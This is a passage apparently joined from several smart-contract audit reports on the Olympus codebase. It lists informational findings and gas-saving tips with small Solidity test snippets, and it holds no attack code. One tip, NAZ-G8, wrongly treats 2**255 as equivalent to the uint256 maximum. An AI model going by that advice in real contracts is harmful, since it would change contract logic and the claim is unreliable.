[`IOperator.sol#L15-L17`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/interfaces/IOperator.sol#L15-L17), [`IOperator.sol#L34`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/interfaces/IOperator.sol#L34), [`IOperator.sol#L72-L73`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/interfaces/IOperator.sol#L72-L73), [`IOperator.sol#L79`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/interfaces/IOperator.sol#L79), [`IOperator.sol#L84`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/interfaces/IOperator.sol#L84), [`IOperator.sol#L90-L91`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/interfaces/IOperator.sol#L90-L91), [`IOperator.sol#L100`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/interfaces/IOperator.sol#L100), [`IOperator.sol#L108`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/interfaces/IOperator.sol#L108), [`IOperator.sol#L124`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/interfaces/IOperator.sol#L124), [`IOperator.sol#L130`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/interfaces/IOperator.sol#L130), [`IOperator.sol#L135`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/interfaces/IOperator.sol#L135), [`IOperator.sol#L141`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/interfaces/IOperator.sol#L141)  **Description**: Max line length must be no more than 120 but many comments are extended past this length.  **Recommendation**: Consider cutting down the line length below 120.   ## [NAZ-N6] Code Contains Empty Blocks **Severity**: Informational **Context**: [`Kernel.sol#L85`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L85), [`Kernel.sol#L95`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L95), [`Kernel.sol#L100`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L100), [`Kernel.sol#L105`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L105), [`Kernel.sol#L115`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L115), [`Kernel.sol#L139`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L139), [`Kernel.sol#L143`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L143), [`TRSRY.sol#L45`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L45), [`VOTES.sol#L19`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/VOTES.sol#L19), [`INSTR.sol#L20`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/INSTR.sol#L20), [`TreasuryCustodian.sol#L24`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/TreasuryCustodian.sol#L24), [`PriceConfig.sol#L15`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/PriceConfig.sol#L15), [`Governance.sol#L59`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L59), [`VoterRegistration.sol#L16`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/VoterRegistration.sol#L16)  **Description**: It's best practice that when there is an empty block, to add a comment in the block explaining why it's empty.  **Recommendation**: Consider adding `/* Comment on why */` to the empty blocks.   ## [NAZ-N7] Use Underscores for Number Literals **Severity**: Informational **Context**: [`RANGE.sol#L245`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L245), [`RANGE.sol#L247`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L247), [`RANGE.sol#L264`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L264), [`Operator.sol#L111`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L111), [`Operator.sol#L518`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L518), [`Operator.sol#L550`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L550), [`Governance.sol#L164`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L164)  **Description**: There are multiple occasions where certain numbers have been hardcoded, either in variables or in the code itself. Large numbers can become hard to read.  **Recommendation**: Consider using underscores for number literals to improve its readability.   ## [NAZ-N8] TODOs Left In The Code **Severity**: Informational **Context**: [`TreasuryCustodian.sol#L51-L52`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/TreasuryCustodian.sol#L51-L52), [`TreasuryCustodian.sol#L56`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/TreasuryCustodian.sol#L56), [`Operator.sol#L657`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L657)  **Description**: There should never be any TODOs in the code when deploying.  **Recommendation**: Consider finishing the TODOs before deploying.   ## [NAZ-N9] Spelling Errors **Severity**: Informational **Context**: [`PRICE.sol#L126 (numbe => number)`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L126), [`Operator.sol#L295 (deactive => deactivate)`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L295), [`Operator.sol#L326 (deactive => deactivate)`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L326)  **Description**: Spelling errors in comments can cause confusion to both users and developers.  **Recommendation**: Consider checking all misspellings to ensure they are corrected..   ## [NAZ-N10] Missing or Incomplete NatSpec **Severity**: Informational **Context**: [`All Contracts`](https://github.com/code-423n4/2022-08-olympus/tree/main/src)  **Description**: Some functions are missing @notice/@dev NatSpec comments for the function, @param for all/some of their parameters and @return for return values. Given that NatSpec is an important part of code documentation, this affects code comprehension, auditability and usability.  **Recommendation**: Consider adding in full NatSpec comments for all functions to have complete code documentation for future use.   ## [NAZ-N11] Older Version Pragma **Severity**: Informational **Context**: [`All Contracts`](https://github.com/code-423n4/2022-08-olympus/tree/main/src)  **Description**: Using very old versions of Solidity prevents benefits of bug fixes and newer security checks. Using the latest versions might make contracts susceptible to undiscovered compiler bugs.   **Recommendation**: Consider using the most recent version.
## [NAZ-G1] Moving `if (proposalHasBeenActivated[proposalId_] == true)`  **Context**: [`Governance.sol#L230-L232`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L230-L232)  **Description**: Moving: ```js if (proposalHasBeenActivated[proposalId_] == true) {  revert ProposalAlreadyActivated(); } ``` earlier in `activateProposal()` will make it fail sooner and save gas.  **Recommendation**:  Consider moving `if (proposalHasBeenActivated[proposalId_] == true)` earlier in `activateProposal()`   ## [NAZ-G2] State Variables That Can Be Set To `Immutable` **Context**: [`BondCallback.sol#L28`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/BondCallback.sol#L28), [`BondCallback.sol#L32`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/BondCallback.sol#L32)  **Description**: Solidity `0.6.5` introduced `immutable` as a major feature. It allows setting contract-level variables at construction time which gets stored in code rather than storage. Each call to it reads from storage, using a `sload` costing 2100 gas cold or 100 gas warm. Setting it to `immutable` will have each storage read of the state variable to be replaced by the instruction `push32 value`, where `value` is set during contract construction time and this costs only 3 gas.  **Recommendation**:  Set the state variable to `immutable`.   ## [NAZ-G3] Right Shift Instead of Dividing By 2 **Context**: [`Operator.sol#L372`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L372), [`Operator.sol#L427`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L427)  **Description**: The `SHR` opcode is 3 gas cheaper than `DIV` and also bypasses Solidity's division by 0 prevention overhead.  **Recommendation**:  Consider using right shift instead of dividing by 2.   ## [NAZ-G4] Functions Visibility Can Be Declared External **Context**: [`Kernel.sol#L439`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L439), [`Kernel.sol#L451`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L451), [`TRSRY.sol#L75`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L75), [`MINTR.sol#L33`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/MINTR.sol#L33), [`MINTR.sol#L37`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/MINTR.sol#L37), [`RANGE.sol#L215`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L215), [`VOTES.sol#L45`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/VOTES.sol#L45), [`VOTES.sol#L51`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/VOTES.sol#L51), [`INSTR.sol#L37`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/INSTR.sol#L37), [`Governance.sol#L145`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L145), [`Governance.sol#L151`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L151)  **Description**: Several functions across multiple contracts have a public visibility and can be marked with external visibility to save gas.   **Recommendation**:  Change the functions visibility to external to save gas.   ## [NAZ-G5] Use `calldata` Instead of `memory` For Function Parameters **Context**: [`TreasuryCustodian.sol#L53`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/TreasuryCustodian.sol#L53), [`BondCallback.sol#L152`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/BondCallback.sol#L152)  **Description**: The dynamic array arr has the storage location memory. When the function gets called externally, the array values are kept in calldata and copied to memory during ABI decoding (using the opcode calldataload and mstore). And during the for loop, arr[i] accesses the value in memory using a mload.  **Recommendation**:  Use `calldata` instead of `memory` for function parameters to avoid using memory with array values when a function is getting called externally.   ## [NAZ-G6] For array elements, `arr[i] = arr[i] + 1` is cheaper than `arr[i] += 1` **Context**: [`TRSRY.sol#L96-L97`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L96-L97), [`TRSRY.sol#L131`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L131), [`VOTES.sol#L58`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/VOTES.sol#L58), [`BondCallback.sol#L143-L144`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/BondCallback.sol#L143-L144), [`Governance.sol#L198`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L198), [`Governance.sol#L252`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L252), [`Governance.sol#254`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L254)  **Description**: Due to stack operations this is 25 gas cheaper when dealing with arrays in storage, and 4 gas cheaper for memory arrays.  **Recommendation**:  Use `arr[i] = arr[i] + 1` instead of `arr[i] += 1` when dealing with arrays   ## [NAZ-G7] Use `++index` instead of `index++` to increment a loop counter **Context**: [`KernelUtils.sol#L49`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/utils/KernelUtils.sol#L49), [`KernelUtils.sol#L64`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/utils/KernelUtils.sol#L64)  **Description**: Due to reduced stack operations, using `++index` saves 5 gas per iteration.  **Recommendation**:  Use `++index `to increment a loop counter.   ## [NAZ-G8] Use of `2**256 - 1 && type(uint256).max` When `2**255` Can Be Used **Context**: [`TRSRY.sol#L147`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L147), [`RANGE.sol#L88`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L88), [`RANGE.sol#L95`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L95), [`RANGE.sol#L221`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L221), [`RANGE.sol#L230`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L230), [`Operator.sol#L167`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L167), [`Operator.sol#L477`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L477), [`Operator.sol#L603`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L603), [`BondCallback.sol#L57`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/BondCallback.sol#L57), [`BondCallback.sol#L95`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/BondCallback.sol#L95)  **Description**: Infinity can also be represented via ``2**255`, it's hex representation is `0x8000000000000000000000000000000000000000000000000000000000000000` while `2**256 - 1` is `0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff`. Then main difference is and where the gas savings come from is, zeros are cheaper than non-zero values in hex representation.  **Recommendation**:  Use `2**255` instead of `2**256 - 1` to save gas on deployment.   ## [NAZ-G9] Setting The Constructor To Payable **Context**: [`All Contracts`](https://github.com/code-423n4/2022-08-olympus/tree/main/src)  **Description**: You can cut out 10 opcodes in the creation-time EVM bytecode if you declare a constructor payable. Making the constructor payable eliminates the need for an initial check of `msg.value == 0` and saves 21 gas on deployment with no security risks.  **Recommendation**:  Set the constructor to payable.   ## [NAZ-G10] Function Ordering via Method ID **Context**: [`All Contracts`](https://github.com/code-423n4/2022-08-olympus/tree/main/src)  **Description**: Contracts most called functions could simply save gas by function ordering via Method ID. Calling a function at runtime will be cheaper if the function is positioned earlier in the order (has a relatively lower Method ID) because 22 gas are added to the cost of a function for every position that came before it. The caller can save on gas if you prioritize most called functions. One could use [`This tool`](https://emn178.github.io/solidity-optimize-name/) to help find alternative function names with lower Method IDs while keeping the original name intact.  **Recommendation**:  Find a lower method ID name for the most called functions for example ```mostCalled()``` vs. ```mostCalled_41q()``` is cheaper by 44 gas. 
# Index [G01] Post-increment/decrement cost more gas then pre-increment/decrement [G02] Array length should not be looked up in every loop of a for-loop [G03] Operatos <= or >= cost more gas than operators < or > [G04] != 0 is cheaper than > 0 [G05] Variable1 = Variable1 + (-) Variable2 is cheaper in gas cost than variable1 += (-=) variable2. [G06] Using private rather than public for constants [G07] Don't compare boolean expressions to boolean literals [G08] Usage of uints/ints smaller than 32 Bytes (256 bits) incurs overhead [G09] Initialize variables with default values are not needed [G10] Using bools for storage incurs overhead [G11] Multiplication/division by two should use bit shifting [G12] Calldata vs Memory [G13] Use a more recent version of solidity [G14] Using storage instead of memory for structs/arrays [G15] Tight variable packing  [G16] Move variable declaration before is going to be used [G17] Refactoring code [G18] Use unchecked when it's not possible to overflow [G19] Internal functions only called once can be inlined to save gas [G20] Remove unused functions  # Details ## [G01] Post-increment/decrement cost more gas then pre-increment/decrement ### Description ++I (--I) cost less gas than I++ (I--) especially in a loop.  ### Proof of concept  ```solidity contract TestPost {  function testPost() public {   uint256 i;   i++;  } } contract TestPre {  function testPre() public {   uint256 i;   ++i;  } } ```  - Transaction cost of testPost is 21333 gas - Transaction cost of testPre is 21328 gas  - After the test it's possible to save **5 gas per ocurrence** with this optimization.  ### Lines in the code [KernelUtils.sol#L49](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/utils/KernelUtils.sol#L49) [KernelUtils.sol#L64](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/utils/KernelUtils.sol#L64) [Operator.sol#L488](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L488) [Operator.sol#L670](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L670) [Operator.sol#L686](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L686)  ## [G02] Array length should not be looked up in every loop of a for-loop ### Description Storage array length checks incur an extra Gwarmaccess (100 gas) per loop.  Store the array length in a variable and use it in the for loop helps to save gas.  ### Proof of concept ```solidity contract TestForLength {  function testArrayLength() public {   uint256[] memory array = new uint256[](10);   for(uint256 i; i < array.length; ){    ++i;   }  } } contract TestForCachLength {  function testArrayLength() public {   uint256[] memory array = new uint256[](10);   uint256 arrayLen = array.length;   for(uint256 i; i < arrayLen; ){    ++i;   }  } } ``` - Transaction cost of TestForLength is 23217 gas - Transaction cost of TestForCachLength is 23200 gas  - After the test it's possible to save 17 gas in this loop so this mean **~2 gas per loop** is saved with this optimization in the test case of a local array.  ### Lines in the code [Governance.sol#L278](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Governance.sol#L278)  ## [G03] Operatos <= or >= cost more gas than operators < or > ### Description Change all <= / >= operators for < / > and remember to increse / decrese in consecuence to maintain the logic (example, a <= b for a < b + 1)  ### Proof of concept  ```solidity contract TestMaxEqual {   function testMaxEqual() public {   uint256 i = 1;   if (i >= 1){    i++;   }  } }  contract TestMax {   function TestMax() public {   uint256 i = 1;   if (i > 0){    i++;   }  } } ```  - Transaction cost of TestMaxEqual is 21367 gas - Transaction cost of TestMax is 21364 gas  - After the test it's possible to save **3 gas per ocurrence** with this optimization.  ### Lines in the code [Operator.sol#L210](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L210) [Operator.sol#L211](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L211) [Operator.sol#L216](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L216) [Operator.sol#L217](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L217) [Operator.sol#L486](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L486) [Operator.sol#L667](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L667) [Operator.sol#L683](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L683)  ## [G04] != 0 is cheaper than > 0 ### Description Replace all > 0 for != 0  ### Lines in the code [Governance.sol#L247](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Governance.sol#L247)  ## [G05] Variable1 = Variable1 + (-) Variable2 is cheaper in gas cost than variable1 += (-=) variable2. ### Description   ### Lines in the code [TRSRY.sol#L96](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/TRSRY.sol#L96) [TRSRY.sol#L97](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/TRSRY.sol#L97) [TRSRY.sol#L115](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/TRSRY.sol#L115) [TRSRY.sol#L116](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/TRSRY.sol#L116) [TRSRY.sol#L131](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/TRSRY.sol#L131) [TRSRY.sol#L132](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/TRSRY.sol#L132) [PRICE.sol#L136](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/PRICE.sol#L136) [PRICE.sol#L138](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/PRICE.sol#L138) [PRICE.sol#L222](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/PRICE.sol#L222) [VOTES.sol#L56](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/VOTES.sol#L56) [VOTES.sol#L58](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/VOTES.sol#L58) [BondCallback.sol#L143](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/BondCallback.sol#L143) [BondCallback.sol#L144](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/BondCallback.sol#L144) [Heart.sol#L103](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Heart.sol#L103) [Governance.sol#L194](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Governance.sol#L194) [Governance.sol#L198](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Governance.sol#L198) [Governance.sol#L252](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Governance.sol#L252) [Governance.sol#L254](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Governance.sol#L254)  ## [G06] Using private rather than public for constants ### Description If needed, the value can be read from the verified contract source code.  Savings are due to the compiler not having to create non-payable getter functions for deployment calldata,  and not adding another entry to the method ID table.  ### Lines in the code [RANGE.sol#L65](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/RANGE.sol#L65) [PRICE.sol#L59](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/PRICE.sol#L59) [Operator.sol#L89](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L89) [Governance.sol#L121](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Governance.sol#L121) [Governance.sol#L124](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Governance.sol#L124) [Governance.sol#L127](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Governance.sol#L127) [Governance.sol#L130](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Governance.sol#L130) [Governance.sol#L133](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Governance.sol#L133) [Governance.sol#L137](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Governance.sol#L137)  ## [G07] Don't compare boolean expressions to boolean literals ### Description if (<x> == true) => if (<x>), if (<x> == false) => if (!<x>)  ### Lines in the code [Governance.sol#L223](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Governance.sol#L223) [Governance.sol#L306](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Governance.sol#L306)   ## [G08] Usage of uints/ints smaller than 32 Bytes (256 bits) incurs overhead ### Description When using elements that are smaller than 32 bytes, your contract's gas usage may be higher. This is because the EVM operates on 32 bytes at a time.  Therefore, if the element is smaller than that, the EVM must use more operations in order to reduce the size of the element from 32 bytes to the desired size. Use a larger size then downcast where needed  ### Lines in the code  [RANGE.sol#L45](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/RANGE.sol#L45) [PRICE.sol#L44](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/PRICE.sol#L44) [PRICE.sol#L47](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/PRICE.sol#L47) [PRICE.sol#L50](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/PRICE.sol#L50) [PRICE.sol#L53](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/PRICE.sol#L53) [PRICE.sol#L56](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/PRICE.sol#L56) [PRICE.sol#L59](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/PRICE.sol#L59) [PRICE.sol#L84](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/PRICE.sol#L84) [PRICE.sol#L87](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/PRICE.sol#L87) [PRICE.sol#L127](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/PRICE.sol#L127) [PRICE.sol#L161](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/PRICE.sol#L161) [PRICE.sol#L185](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/PRICE.sol#L185) [Operator.sol#L83](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L83) [Operator.sol#L86](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L86) [Operator.sol#L89](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L89) [Operator.sol#L371](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L371) [Operator.sol#L372](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L372) [Operator.sol#L375](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L375) [Operator.sol#L418](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L418) [Operator.sol#L426](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L426) [Operator.sol#L427](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L427) [Operator.sol#L430](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L430) [Operator.sol#L485](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L485) [Operator.sol#L665](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L665) [IOperator.sol#L13](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/interfaces/IOperator.sol#L13) [IOperator.sol#L14](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/interfaces/IOperator.sol#L14) [IOperator.sol#L15](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/interfaces/IOperator.sol#L15) [IOperator.sol#L16](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/interfaces/IOperator.sol#L16) [IOperator.sol#L17](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/interfaces/IOperator.sol#L17) [IOperator.sol#L18](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/interfaces/IOperator.sol#L18) [IOperator.sol#L19](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/interfaces/IOperator.sol#L19) [IOperator.sol#L20](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/interfaces/IOperator.sol#L20) [IOperator.sol#L31](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/interfaces/IOperator.sol#L31) [IOperator.sol#L32](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/interfaces/IOperator.sol#L32) [IOperator.sol#L33](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/interfaces/IOperator.sol#L33)  ## [G09] Initialize variables with default values are not needed ### Description If a variable is not set/initialized, it is assumed to have the default value (0 for uint, false for bool, address(0) for address�). Explicitly initializing it with its default value is an anti-pattern and wastes gas.  ### Lines in the code  [Kernel.sol#L397](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/Kernel.sol#L397) [KernelUtils.sol#L43](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/utils/KernelUtils.sol#L43) [KernelUtils.sol#L58](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/utils/KernelUtils.sol#L58)  Assuming than uint's less than 256 are updated to uint256. [Operator.sol#L127](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L127) [Operator.sol#L129](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L129) [Operator.sol#403](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L403) 